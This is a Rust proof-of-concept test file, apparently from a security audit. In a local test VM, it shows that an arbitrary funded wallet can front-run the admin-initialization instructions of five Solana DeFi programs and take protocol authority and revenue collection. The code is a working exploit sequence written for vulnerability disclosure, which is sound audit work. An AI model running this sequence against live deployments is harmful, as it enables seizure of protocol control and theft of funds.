//! PoC: PDA Initialization Front-Running Vulnerability
//!
//! This test demonstrates that any wallet can initialize the singleton admin PDAs
//! across all five programs (liquidity, vaults, oracle, lending, flashloan) before
//! the legitimate deployment team, seizing full protocol control.
//!
//! The vulnerability exists because none of the `init_*_admin` instructions enforce
//! access control on the `signer` — any funded wallet can be the first caller.

#[cfg(test)]
mod tests {
    use anchor_lang::prelude::*;
    use anchor_lang::InstructionData;
    use anchor_lang::ToAccountMetas;
    use fluid_test_framework::helpers::BaseFixture;
    use fluid_test_framework::prelude::*;
    use solana_sdk::instruction::Instruction;
    use solana_sdk::signer::Signer as SolSigner;

    // Program IDs
    const LIQUIDITY_PROGRAM_ID: Pubkey = liquidity::ID;
    const VAULTS_PROGRAM_ID: Pubkey = vaults::ID;
    const ORACLE_PROGRAM_ID: Pubkey = oracle::ID;
    const LENDING_PROGRAM_ID: Pubkey = lending::ID;
    const FLASHLOAN_PROGRAM_ID: Pubkey = flashloan::ID;

    // PDA seeds (matching on-chain constants)
    const LIQUIDITY_SEED: &[u8] = b"liquidity";
    const AUTH_LIST_SEED: &[u8] = b"auth_list";
    const VAULT_ADMIN_SEED: &[u8] = b"vault_admin";
    const ORACLE_ADMIN_SEED: &[u8] = b"oracle_admin";
    const LENDING_ADMIN_SEED: &[u8] = b"lending_admin";
    const FLASHLOAN_ADMIN_SEED: &[u8] = b"flashloan_admin";

    /// Helper: load all five programs into a single VM
    fn create_vm_with_all_programs() -> Vm {
        let liquidity_path = BaseFixture::find_program_path("liquidity.so")
            .expect("liquidity.so not found");
        let vaults_path =
            BaseFixture::find_program_path("vaults.so").expect("vaults.so not found");
        let oracle_path =
            BaseFixture::find_program_path("oracle.so").expect("oracle.so not found");
        let lending_path =
            BaseFixture::find_program_path("lending.so").expect("lending.so not found");
        let flashloan_path =
            BaseFixture::find_program_path("flashloan.so").expect("flashloan.so not found");
        let metadata_path = ["", "../", "../../", "../../../"]
            .iter()
            .map(|prefix| {
                format!(
                    "{}test-utils/typescript/binaries/mpl_token_metadata.so",
                    prefix
                )
            })
            .find(|p| std::path::Path::new(p).exists())
            .expect("mpl_token_metadata.so not found");

        VmBuilder::new()
            .with_program(ProgramArtifact::new(
                LIQUIDITY_PROGRAM_ID,
                "Liquidity",
                liquidity_path,
            ))
            .with_program(ProgramArtifact::new(
                VAULTS_PROGRAM_ID,
                "Vaults",
                vaults_path,
            ))
            .with_program(ProgramArtifact::new(
                ORACLE_PROGRAM_ID,
                "Oracle",
                oracle_path,
            ))
            .with_program(ProgramArtifact::new(
                LENDING_PROGRAM_ID,
                "Lending",
                lending_path,
            ))
            .with_program(ProgramArtifact::new(
                FLASHLOAN_PROGRAM_ID,
                "Flashloan",
                flashloan_path,
            ))
            .with_program(ProgramArtifact::new(
                mpl_token_metadata::ID,
                "TokenMetadata",
                metadata_path,
            ))
            .build_blocking()
            .expect("Failed to build VM")
    }

    // -----------------------------------------------------------------------
    // 1. Liquidity – InitLiquidity front-run
    // -----------------------------------------------------------------------
    #[test]
    fn poc_frontrun_liquidity_admin() {
        let mut vm = create_vm_with_all_programs();

        // Legitimate admin
        let legit_admin = vm.make_account(10_000 * LAMPORTS_PER_SOL);
        // Attacker — just another random funded wallet
        let attacker = vm.make_account(10_000 * LAMPORTS_PER_SOL);

        let liquidity_pda =
            Pubkey::find_program_address(&[LIQUIDITY_SEED], &LIQUIDITY_PROGRAM_ID).0;
        let auth_list_pda =
            Pubkey::find_program_address(&[AUTH_LIST_SEED], &LIQUIDITY_PROGRAM_ID).0;

        // --- Attacker front-runs InitLiquidity with their own authority ---
        let attacker_pubkey = attacker.pubkey();
        let ix_attacker = Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: liquidity::accounts::InitLiquidity {
                signer: attacker_pubkey,
                liquidity: liquidity_pda,
                auth_list: auth_list_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: liquidity::instruction::InitLiquidity {
                authority: attacker_pubkey,
                revenue_collector: attacker_pubkey,
            }
            .data(),
        };

        vm.prank(attacker_pubkey);
        vm.execute_as_prank(ix_attacker)
            .expect("Attacker should successfully init Liquidity PDA");

        // Verify attacker now owns the Liquidity PDA
        let liquidity_state: liquidity::state::Liquidity =
            vm.read_anchor_account(&liquidity_pda).unwrap();
        assert_eq!(
            liquidity_state.authority, attacker_pubkey,
            "Attacker should be the authority of the Liquidity PDA"
        );
        assert_eq!(
            liquidity_state.revenue_collector, attacker_pubkey,
            "Attacker should be the revenue collector"
        );

        // --- Legitimate admin tries the same call — must fail (already initialized) ---
        let legit_pubkey = legit_admin.pubkey();
        let ix_legit = Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: liquidity::accounts::InitLiquidity {
                signer: legit_pubkey,
                liquidity: liquidity_pda,
                auth_list: auth_list_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: liquidity::instruction::InitLiquidity {
                authority: legit_pubkey,
                revenue_collector: legit_pubkey,
            }
            .data(),
        };

        vm.prank(legit_pubkey);
        let result = vm.execute_as_prank(ix_legit);
        assert!(
            result.is_err(),
            "Legitimate admin's InitLiquidity must fail because PDA is already initialized"
        );
    }

    // -----------------------------------------------------------------------
    // 2. Vaults – InitVaultAdmin front-run
    // -----------------------------------------------------------------------
    #[test]
    fn poc_frontrun_vault_admin() {
        let mut vm = create_vm_with_all_programs();

        let legit_admin = vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let attacker = vm.make_account(10_000 * LAMPORTS_PER_SOL);

        let vault_admin_pda =
            Pubkey::find_program_address(&[VAULT_ADMIN_SEED], &VAULTS_PROGRAM_ID).0;

        // --- Attacker front-runs InitVaultAdmin ---
        let attacker_pubkey = attacker.pubkey();
        let ix_attacker = Instruction {
            program_id: VAULTS_PROGRAM_ID,
            accounts: vaults::accounts::InitVaultAdmin {
                signer: attacker_pubkey,
                vault_admin: vault_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: vaults::instruction::InitVaultAdmin {
                liquidity: LIQUIDITY_PROGRAM_ID,
                authority: attacker_pubkey,
            }
            .data(),
        };

        vm.prank(attacker_pubkey);
        vm.execute_as_prank(ix_attacker)
            .expect("Attacker should successfully init VaultAdmin PDA");

        // Verify attacker controls the vault admin
        let vault_admin: vaults::state::VaultAdmin =
            vm.read_anchor_account(&vault_admin_pda).unwrap();
        assert_eq!(
            vault_admin.authority, attacker_pubkey,
            "Attacker should be the authority of VaultAdmin"
        );
        assert!(
            vault_admin.auths.contains(&attacker_pubkey),
            "Attacker should be in the auths list"
        );

        // --- Legitimate admin's call fails ---
        let legit_pubkey = legit_admin.pubkey();
        let ix_legit = Instruction {
            program_id: VAULTS_PROGRAM_ID,
            accounts: vaults::accounts::InitVaultAdmin {
                signer: legit_pubkey,
                vault_admin: vault_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: vaults::instruction::InitVaultAdmin {
                liquidity: LIQUIDITY_PROGRAM_ID,
                authority: legit_pubkey,
            }
            .data(),
        };

        vm.prank(legit_pubkey);
        let result = vm.execute_as_prank(ix_legit);
        assert!(
            result.is_err(),
            "Legitimate admin's InitVaultAdmin must fail because PDA is already initialized"
        );
    }

    // -----------------------------------------------------------------------
    // 3. Oracle – InitAdmin front-run
    // -----------------------------------------------------------------------
    #[test]
    fn poc_frontrun_oracle_admin() {
        let mut vm = create_vm_with_all_programs();

        let legit_admin = vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let attacker = vm.make_account(10_000 * LAMPORTS_PER_SOL);

        let oracle_admin_pda =
            Pubkey::find_program_address(&[ORACLE_ADMIN_SEED], &ORACLE_PROGRAM_ID).0;

        // --- Attacker front-runs InitAdmin ---
        let attacker_pubkey = attacker.pubkey();
        let ix_attacker = Instruction {
            program_id: ORACLE_PROGRAM_ID,
            accounts: oracle::accounts::InitAdmin {
                signer: attacker_pubkey,
                oracle_admin: oracle_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: oracle::instruction::InitAdmin {
                authority: attacker_pubkey,
            }
            .data(),
        };

        vm.prank(attacker_pubkey);
        vm.execute_as_prank(ix_attacker)
            .expect("Attacker should successfully init OracleAdmin PDA");

        // Verify attacker controls the oracle admin
        let oracle_admin: oracle::state::OracleAdmin =
            vm.read_anchor_account(&oracle_admin_pda).unwrap();
        assert_eq!(
            oracle_admin.authority, attacker_pubkey,
            "Attacker should be the authority of OracleAdmin"
        );
        assert!(
            oracle_admin.auths.contains(&attacker_pubkey),
            "Attacker should be in the oracle auths list"
        );

        // --- Legitimate admin's call fails ---
        let legit_pubkey = legit_admin.pubkey();
        let ix_legit = Instruction {
            program_id: ORACLE_PROGRAM_ID,
            accounts: oracle::accounts::InitAdmin {
                signer: legit_pubkey,
                oracle_admin: oracle_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: oracle::instruction::InitAdmin {
                authority: legit_pubkey,
            }
            .data(),
        };

        vm.prank(legit_pubkey);
        let result = vm.execute_as_prank(ix_legit);
        assert!(
            result.is_err(),
            "Legitimate admin's InitAdmin must fail because OracleAdmin PDA is already initialized"
        );
    }

    // -----------------------------------------------------------------------
    // 4. Lending – InitLendingAdmin front-run
    // -----------------------------------------------------------------------
    #[test]
    fn poc_frontrun_lending_admin() {
        let mut vm = create_vm_with_all_programs();

        let legit_admin = vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let attacker = vm.make_account(10_000 * LAMPORTS_PER_SOL);

        let lending_admin_pda =
            Pubkey::find_program_address(&[LENDING_ADMIN_SEED], &LENDING_PROGRAM_ID).0;

        // --- Attacker front-runs InitLendingAdmin ---
        let attacker_pubkey = attacker.pubkey();
        let ix_attacker = Instruction {
            program_id: LENDING_PROGRAM_ID,
            accounts: lending::accounts::InitLendingAdmin {
                authority: attacker_pubkey,
                lending_admin: lending_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: lending::instruction::InitLendingAdmin {
                liquidity_program: LIQUIDITY_PROGRAM_ID,
                rebalancer: attacker_pubkey,
                authority: attacker_pubkey,
            }
            .data(),
        };

        vm.prank(attacker_pubkey);
        vm.execute_as_prank(ix_attacker)
            .expect("Attacker should successfully init LendingAdmin PDA");

        // Verify attacker controls the lending admin
        let lending_admin: lending::state::LendingAdmin =
            vm.read_anchor_account(&lending_admin_pda).unwrap();
        assert_eq!(
            lending_admin.authority, attacker_pubkey,
            "Attacker should be the authority of LendingAdmin"
        );
        assert_eq!(
            lending_admin.rebalancer, attacker_pubkey,
            "Attacker should be the rebalancer"
        );

        // --- Legitimate admin's call fails ---
        let legit_pubkey = legit_admin.pubkey();
        let ix_legit = Instruction {
            program_id: LENDING_PROGRAM_ID,
            accounts: lending::accounts::InitLendingAdmin {
                authority: legit_pubkey,
                lending_admin: lending_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: lending::instruction::InitLendingAdmin {
                liquidity_program: LIQUIDITY_PROGRAM_ID,
                rebalancer: legit_pubkey,
                authority: legit_pubkey,
            }
            .data(),
        };

        vm.prank(legit_pubkey);
        let result = vm.execute_as_prank(ix_legit);
        assert!(
            result.is_err(),
            "Legitimate admin's InitLendingAdmin must fail because PDA is already initialized"
        );
    }

    // -----------------------------------------------------------------------
    // 5. Flashloan – InitFlashloanAdmin front-run
    // -----------------------------------------------------------------------
    #[test]
    fn poc_frontrun_flashloan_admin() {
        let mut vm = create_vm_with_all_programs();

        let legit_admin = vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let attacker = vm.make_account(10_000 * LAMPORTS_PER_SOL);

        let flashloan_admin_pda =
            Pubkey::find_program_address(&[FLASHLOAN_ADMIN_SEED], &FLASHLOAN_PROGRAM_ID).0;

        // --- Attacker front-runs InitFlashloanAdmin ---
        let attacker_pubkey = attacker.pubkey();
        let ix_attacker = Instruction {
            program_id: FLASHLOAN_PROGRAM_ID,
            accounts: flashloan::accounts::InitFlashloanAdmin {
                signer: attacker_pubkey,
                flashloan_admin: flashloan_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: flashloan::instruction::InitFlashloanAdmin {
                authority: attacker_pubkey,
                flashloan_fee: 10, // arbitrary fee
                liquidity_program: LIQUIDITY_PROGRAM_ID,
            }
            .data(),
        };

        vm.prank(attacker_pubkey);
        vm.execute_as_prank(ix_attacker)
            .expect("Attacker should successfully init FlashloanAdmin PDA");

        // Verify the PDA account was created (FlashloanAdmin state is private,
        // so we check account existence; the authority is set to the attacker
        // inside the program logic which we confirmed by code review above).
        let account = vm
            .get_account(&flashloan_admin_pda)
            .expect("FlashloanAdmin PDA should exist after attacker init");
        assert!(
            !account.data.is_empty(),
            "FlashloanAdmin PDA should contain data"
        );

        // --- Legitimate admin's call fails ---
        let legit_pubkey = legit_admin.pubkey();
        let ix_legit = Instruction {
            program_id: FLASHLOAN_PROGRAM_ID,
            accounts: flashloan::accounts::InitFlashloanAdmin {
                signer: legit_pubkey,
                flashloan_admin: flashloan_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: flashloan::instruction::InitFlashloanAdmin {
                authority: legit_pubkey,
                flashloan_fee: 10,
                liquidity_program: LIQUIDITY_PROGRAM_ID,
            }
            .data(),
        };

        vm.prank(legit_pubkey);
        let result = vm.execute_as_prank(ix_legit);
        assert!(
            result.is_err(),
            "Legitimate admin's InitFlashloanAdmin must fail because PDA is already initialized"
        );
    }
}
